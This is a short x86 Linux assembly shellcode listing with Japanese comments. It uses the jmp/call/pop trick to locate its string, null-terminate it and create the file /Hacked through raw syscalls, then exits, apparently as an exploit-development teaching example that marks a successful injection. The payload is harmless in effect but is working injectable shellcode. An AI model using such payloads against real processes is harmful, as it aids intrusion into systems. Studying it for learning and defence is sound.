BITS 32 
; 実際に実行した証拠を残すため、ファイルシステムに痕跡を残す。
   jmp short one 
   two: 
   pop ebx              ; ファイル名 
   xor ecx, ecx 
   mov BYTE [ebx+7], cl ; ファイル名の終端にnullを設定する
   push BYTE 0x5        ; ファイルのオープン 
   pop eax 
   mov WORD cx, 0x441   ; O_WRONLY|O_APPEND|O_CREAT 
   xor edx, edx 
   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR 
   int 0x80             ; ファイルを作成するためにオープンする
      ; eax = 戻り値のファイル記述子
   mov ebx, eax         ; ファイル記述子を第2引数に設定する
   push BYTE 0x6        ; ファイルのクローズ 
   pop eax 
   int 0x80  ; ファイルのクローズを行う

   xor eax, eax 
   mov ebx, eax 
   inc eax    ; exit呼び出し
   int 0x80   ; 無限ループを避けるためにexit(0)する
one: 
   call two 
db "/HackedX" 
;   01234567 
